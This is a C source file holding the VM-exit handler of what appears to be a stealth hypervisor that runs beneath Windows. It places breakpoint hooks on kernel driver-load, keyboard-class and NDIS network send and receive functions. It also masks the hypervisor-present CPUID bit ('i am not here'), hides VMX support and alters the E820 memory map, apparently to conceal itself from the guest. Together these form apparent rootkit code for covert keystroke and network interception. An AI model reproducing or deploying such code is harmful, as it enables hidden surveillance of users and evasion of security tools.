#include <vmm/vmcs.h>
#include <lib/instr.h>
#include <vmm/vmm.h>
#include <hooks/int15h.h>
#include <boot/addresses.h>
#include <hardware/apic.h>
#include <lib/msr.h>
#include <lib/util.h>
#include <hooks/hooking.h> 
#include <hooks/keyboard.h> 
#include <hooks/ndis.h> 


#define LOWER_DWORD(x) ((x) & 0xffffffffull)
#define LOWER_WORD(x) ((x) & 0xffffull)
#define UPPER_DWORD(x) ((x) >> 32)

void __attribute__((section(".vmm"))) initialize_vmexit_data(vmexit_data_t *data){

    data->registers = (guest_registers_t*)__read_fs();

    // Intel SDM 25.9.1, 28.2.1
    data->exit_reason = (BASIC_EXIT_REASON)__vmread(RODATA_EXIT_REASON);
    data->exit_qual = (exit_qualification_t)__vmread(RODATA_EXIT_QUALIFICATION);
    data->guest_linear_address = __vmread(RODATA_GUEST_LINEAR_ADDRESS);
    data->guest_physical_address = __vmread(RODATA_GUEST_PHYSICAL_ADDRESS);

    // Intel SDM 25.9.2
    data->interruption_info.value = __vmread(RODATA_VMEXIT_INTERRUPTION_INFO);
    data->interruption_errorcode = __vmread(RODATA_VMEXIT_INTERRUPTION_ERRORCODE);
    
    // Intel SDM 25.9.3
    data->idt_info.value = __vmread(RODATA_IDT_VECTORING_INFO);
    data->idt_errorcode = __vmread(RODATA_IDT_VECTORING_ERRORCODE);
    
    // Intel SDM 25.9.4
    data->instr_length = __vmread(RODATA_VMEXIT_INSTRUCTION_LENGTH);
    data->instr_info.value = __vmread(RODATA_VMEXIT_INSTRUCTION_INFO); // 28.2.5
    
    // Intel SDM 25.9.5
    data->vmx_error = __vmread(RODATA_VM_INSTRUCTION_ERROR);
}

void __attribute__((section(".vmm"))) vmexit_handler(){
    
    vmexit_data_t state;
    initialize_vmexit_data(&state);

    if (state.vmx_error)
        LOG_ERROR("VMX ERROR %d\n", state.vmx_error);

    if (state.exit_reason == 0 && state.interruption_info.valid && state.interruption_info.vector == INT3){
        if (__vmread(GUEST_RIP) == shared_cores_data.ntoskrnl + NTOSKRNL_MiDriverLoadSucceeded_OFFSET){
            handle_MiDriverLoadSucceeded_hook(&state);
            __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+(qword_t)state.instr_length);
            return;
        }
        else if (__vmread(GUEST_RIP) == shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET){
            handle_KeyboardClassServiceCallback_hook(&state);
            __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+(qword_t)state.instr_length);
            return;
        }
        else if (shared_cores_data.send_pending && __vmread(GUEST_RIP) == shared_cores_data.ndis + NDIS_NdisSendNetBufferLists_OFFSET){
            handle_NdisSendNetBufferLists_hook(&state);
            __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+(qword_t)state.instr_length);
            return;
        }
        else if (__vmread(GUEST_RIP) == shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET){
            handle_NdisMIndicateReceiveNetBufferLists_hook(&state);
            __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+2);
            return;
        }
    }
    switch (state.exit_reason){
        case EXIT_REASON_INIT:
            // LOG_DEBUG("INIT VMEXIT\n");
            __vmwrite(GUEST_ACTIVITY_STATE, ACTIVITY_STATE_WAIT_FOR_SIPI);
            return;
        case EXIT_REASON_SIPI:
            uint8_t vector = state.exit_qual.sipi.vector;
            #if DEBUG_VMEXITS
            LOG_DEBUG("SIPI VMEXIT (%x)\n", vector*PAGE_SIZE);
            #endif
            __vmwrite(GUEST_RIP, 0);
            __vmwrite(GUEST_CS, vector<<8);
            __vmwrite(GUEST_CS_BASE, vector<<12);
            __vmwrite(GUEST_ACTIVITY_STATE, ACTIVITY_STATE_ACTIVE);
            return;
        case EXIT_REASON_WRMSR:
            qword_t msr = LOWER_DWORD(state.registers->rcx);
            qword_t value = LOWER_DWORD(state.registers->rax) | (state.registers->rdx<<32);
            #if DEBUG_VMEXITS
            // LOG_DEBUG("WRMSR VMEXIT (%x, %x)\n", msr, value);
            #endif
            __wrmsr(msr, value);
            if (msr == IA32_APIC_BASE && (value & X2APIC_ENABLE != 0)){
                LOG_DEBUG("Guest is trying to enable X2APIC...\n");
            }
            if (msr == LSTAR_MSR){
                // LOG_DEBUG("Guest is writing to LSTAR (%x)\n", value);
                handle_lstar_write(value);
            }
            break;
        case EXIT_REASON_RDMSR:
            msr = LOWER_DWORD(state.registers->rcx);
            #if DEBUG_VMEXITS
            LOG_DEBUG("RDMSR VMEXIT (%x)\n", msr);
            #endif
            value = __rdmsr(msr);
            state.registers->rdx = (state.registers->rdx>>32<<32) | value >> 32;
            state.registers->rax = (state.registers->rax>>32<<32) | LOWER_DWORD(value);
            break;
        case EXIT_REASON_CPUID:
            #if DEBUG_VMEXITS
            LOG_DEBUG("CPUID VMEXIT\n");
            #endif
            qword_t eax_in, ecx_in, eax, ebx, ecx, edx;
            eax_in = LOWER_DWORD(state.registers->rax);
            ecx_in = LOWER_DWORD(state.registers->rcx);
            __cpuid(eax_in, ecx_in, &eax, &ebx, &ecx, &edx);
            state.registers->rax = (qword_t)eax;
            state.registers->rcx = (qword_t)ecx;
            state.registers->rbx = (qword_t)ebx;
            state.registers->rdx = (qword_t)edx;

            if (eax_in == 1){
                state.registers->rcx &= ~(1<<31);   // hypervisor present bit (i am not here)
                state.registers->rcx &= ~(1<<5);    // no VMX support (todo nested virtualization)
            }

            break;
        case EXIT_REASON_GETSEC:
            LOG_DEBUG("GETSEC VMEXIT\n");
            break;
        case EXIT_REASON_INVD:
            LOG_DEBUG("INVD VMEXIT\n");
            break;
        case EXIT_REASON_XSETBV:
            #if DEBUG_VMEXITS
            LOG_DEBUG("XSETBV VMEXIT\n");
            #endif
            __xsetbv((dword_t)state.registers->rax, (dword_t)state.registers->rcx, (dword_t)state.registers->rdx);
            break;
        case EXIT_REASON_INVEPT:
            LOG_DEBUG("INVEPT VMEXIT\n");
            break;
        case EXIT_REASON_INVVPID:
            LOG_DEBUG("INVVPID VMEXIT\n");
            break;
        case EXIT_REASON_VMCALL:
            #if DEBUG_VMEXITS
            LOG_DEBUG("VMCALL VMEXIT\n");
            #endif
            if (__vmread(GUEST_RIP) == HOOK_INT15H){
                if (state.registers->rax == 0xe820){
                    handle_int15h_hook(&state);
                } else {
                    __vmwrite(GUEST_RIP, shared_cores_data.int15h_offset);
                    __vmwrite(GUEST_CS, shared_cores_data.int15h_segment);
                    __vmwrite(GUEST_CS_BASE, shared_cores_data.int15h_segment<<4);
                }
            }
            else if (LOWER_WORD(state.registers->rax) == 0x1234 && LOWER_WORD(state.registers->rbx) == 0xabcd){
                protect_vmm_memory();
                LOG_DEBUG("Jumping to guest...\n");
                __wrmsr(IA32_APIC_BASE, __rdmsr(IA32_APIC_BASE) & (~X2APIC_ENABLE) & (~XAPIC_GLOBAL_ENABLE));
                __wrmsr(IA32_APIC_BASE, __rdmsr(IA32_APIC_BASE) | XAPIC_GLOBAL_ENABLE);
                __vmwrite(GUEST_RIP, JumpToGuest-low_functions_start+REAL_START);
            }
            return;
        case EXIT_REASON_VMCLEAR:
            LOG_DEBUG("VMCLEAR VMEXIT\n");
            break;
        case EXIT_REASON_VMLAUNCH:
            LOG_DEBUG("VMLAUNCH VMEXIT\n");
            break;
        case EXIT_REASON_VMPTRLD:
            LOG_DEBUG("VMPTRLD VMEXIT\n");
            break;
        case EXIT_REASON_VMPTRST:
            LOG_DEBUG("VMPTRST VMEXIT\n");
            break;
        case EXIT_REASON_VMRESUME:
            LOG_DEBUG("VMRESUME VMEXIT\n");
            break;
        case EXIT_REASON_VMXOFF:
            LOG_DEBUG("VMXOFF VMEXIT\n");
            break;
        case EXIT_REASON_VMXON:
            LOG_DEBUG("VMXON VMEXIT\n");
            break;
        case EXIT_REASON_IO_INSTRUCTION:
            LOG_DEBUG("IO VMEXIT\n");
            break;
        case EXIT_REASON_HLT:
            LOG_DEBUG("HLT VMEXIT\n");
            break;
        default:
            LOG_DEBUG("Unknown VMEXIT (%x, %x)\n\t\tQual: %x\n\t\tInterruption info: %x (%x)\n\t\tIDT info: %x (%x)\n\t\tGUEST_RIP: %x\n\t\tNEXT_GUEST_RIP: %x\n\t\tINSTR_LENGTH: %x\n\t\tGuest CS: %x (%x)\n\t\tCode (real): %m20%\n\t\tCode (long): %m20%\n\t\tCR0: %b\n\t\tCR4: %b\n\t\tEFER: %b\n",
                        (BASIC_EXIT_REASON)__vmread(RODATA_EXIT_REASON),
                        __vmread(RODATA_VM_INSTRUCTION_ERROR),
                        state.exit_qual.value,
                        (qword_t)state.interruption_info.value,
                        (qword_t)state.interruption_errorcode,
                        (qword_t)state.idt_info.value,
                        (qword_t)state.idt_errorcode,
                        __vmread(GUEST_RIP),
                        __vmread(GUEST_RIP)+(qword_t)state.instr_length,
                        (qword_t)state.instr_length,
                        __vmread(GUEST_CS),
                        __vmread(GUEST_CS_BASE),
                        __vmread(GUEST_RIP)+__vmread(GUEST_CS_BASE),
                        __vmread(GUEST_RIP), 
                        __vmread(GUEST_CR0),
                         __vmread(GUEST_CR4), 
                         __vmread(GUEST_IA32_EFER));
            while(1);
    }

    // LOG_DEBUG("GUEST_RIP: %x\n\tNEXT_GUEST_RIP: %x\n\tINSTR_LENGTH: %x\n", __vmread(GUEST_RIP), __vmread(GUEST_RIP)+(qword_t)state.instr_length, (qword_t)state.instr_length);
    __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+(qword_t)state.instr_length);
}
